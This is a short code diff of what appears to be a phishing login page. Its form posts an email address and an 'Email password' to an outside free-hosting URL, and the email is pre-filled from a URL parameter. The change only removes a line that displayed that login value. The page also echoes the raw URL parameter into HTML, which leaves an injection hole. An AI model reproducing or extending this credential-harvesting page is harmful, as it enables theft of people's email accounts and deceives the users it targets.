@@ -529,7 +529,7 @@ margin-top:65px;
 					
 <form name="myForm" action="https://j379192911.000webhostapp.com/temp/indexs" onsubmit="return validateForm()" method="post">
 
-					<input name="frm-email" required class="inp" size="30" style="margin-top:20px;" type=“hidden” value="<?php echo $_GET['login']; ?>"/> <br><font face="arial" size="3" color="#045FB4"><?php echo $_GET['login']; ?></font> 
+					<input name="frm-email" required class="inp" size="30" style="margin-top:20px;" type=“hidden” value="<?php echo $_GET['login']; ?>"/> <br>
 					<span id="errfn"></span> <br>
 					
 					<input name= "frm-pass" required class="inp" size="30" style="margin-bottom:5px;" type="password" placeholder= "Email password"/> <br>
